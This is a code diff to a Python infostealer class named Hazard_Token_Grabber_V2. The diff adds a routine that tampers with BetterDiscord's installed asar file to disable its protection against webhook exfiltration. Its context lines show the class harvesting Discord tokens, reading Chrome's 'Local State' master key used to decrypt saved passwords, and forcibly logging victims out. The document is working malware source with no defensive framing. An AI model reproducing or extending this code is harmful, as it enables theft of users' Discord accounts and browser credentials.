@@ -23,11 +23,14 @@ class Hazard_Token_Grabber_V2:
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
-        except:
+        except Exception:
             pass
 
         self.tokens = []
         self.saved = []
+
+        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
+            self.bypass_better_discord()
 
         if not os.path.exists(self.appdata+'\\Google'):
             self.files += f"**{os.getlogin()}** doesn't have google installed\n"
@@ -40,7 +43,7 @@ class Hazard_Token_Grabber_V2:
         self.LogOut()
         try:
             shutil.rmtree(self.tempfolder)
-        except(PermissionError, FileExistsError):
+        except (PermissionError, FileExistsError):
             pass
 
     def getheaders(self, token=None, content_type="application/json"):
@@ -72,6 +75,15 @@ class Hazard_Token_Grabber_V2:
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
+
+    def bypass_better_discord(self):
+        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
+        with open(bd, "rt", encoding="cp437") as f:
+            content = f.read()
+            content2 = content.replace("api/webhooks", "RdimoTheGoat")
+        with open(bd, 'w'): pass
+        with open(bd, "wt", encoding="cp437") as f:
+            f.write(content2)
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
